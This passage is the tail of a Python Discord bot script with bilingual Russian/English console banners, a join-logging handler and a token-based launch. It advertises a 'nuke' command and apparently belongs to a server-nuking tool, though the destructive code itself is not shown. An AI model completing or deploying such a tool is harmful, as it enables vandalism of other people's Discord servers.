        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}CTRL+U: Copy invite link\n'
    )
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Логин: {Fore.GREEN}{client.user.name}{Fore.RED}#{Fore.GREEN}{client.user.discriminator}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Login: {Fore.GREEN}{client.user.name}{Fore.RED}#{Fore.GREEN}{client.user.discriminator}'
    )
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Кол-во серверов: {Fore.GREEN}{len(client.guilds)}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Servers: {Fore.GREEN}{len(client.guilds)}'
    )
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Префикс команд: {Fore.GREEN}{client.command_prefix}\n'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Command prefix: {Fore.GREEN}{client.command_prefix}\n'
    )
    print(Fore.YELLOW +
          f'{client.command_prefix}{Fore.RED}nuke{Fore.YELLOW} - запуск\n'
          if lang == 1 else Fore.YELLOW +
          f'{client.command_prefix}{Fore.RED}nuke{Fore.YELLOW} - start\n')


@client.event
async def on_guild_join(guild):
    print(
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Подключено к серверу: {guild.name} ({guild.id})'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}+{Fore.RED}] {Fore.YELLOW}Connected to server: {guild.name} ({guild.id})'
    )


try:
    client.run(data['BOT_TOKEN'])
except:
    clear()
    print(
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Неверный токен: {data["BOT_TOKEN"]}{Fore.WHITE}'
        if lang == 1 else
        f'{Fore.RED}[{Fore.WHITE}x{Fore.RED}] {Fore.YELLOW}Invalid token: {data["BOT_TOKEN"]}{Fore.WHITE}'
    )
    input(Fore.YELLOW + f'\nENTER {Fore.RED}> Выйти ' +
          ResetColor() if lang == 1 else Fore.YELLOW +
          f'\nENTER {Fore.RED}> Quit ' + ResetColor())
